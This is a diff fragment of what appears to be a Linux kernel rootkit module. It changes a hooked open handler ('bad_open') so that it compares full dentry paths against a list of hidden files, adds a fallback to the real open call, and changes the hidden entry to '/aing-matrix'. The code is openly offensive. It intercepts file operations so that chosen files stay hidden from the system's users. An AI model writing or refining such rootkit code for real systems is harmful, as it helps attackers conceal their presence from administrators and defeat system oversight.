@@ -608,11 +608,16 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
 }
 
 int bad_open(struct inode * ino, struct file *f) {
-    const unsigned char *path_name = f->f_path.dentry->d_name.name;
+    char name_buf[PATH_MAX];
+    char *path_name = dentry_path_raw(f->f_path.dentry, name_buf, PATH_MAX);
     int i;
     int result = 0;
 
     printk(KERN_ALERT "Bad open called\n");
+
+    if (!path_name) {
+        goto legit_open;
+    }
 
     for (i = 0; i < hidden_file_count; ++i) {
         if (strncmp(path_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
@@ -621,6 +626,7 @@ int bad_open(struct inode * ino, struct file *f) {
         }
     }
     //Perform open call here
+legit_open:
     result = backup_file_ops->open(ino, f);
     return result;
 }
@@ -665,7 +671,7 @@ static int __init mod_init(void) {
         return -1;
     }
 
-    strcpy(hidden_files[hidden_file_count++], "aing-matrix");
+    strcpy(hidden_files[hidden_file_count++], "/aing-matrix");
 
     my_file_inode = my_file_path.dentry->d_inode;
     file_ops = *my_file_inode->i_fop;
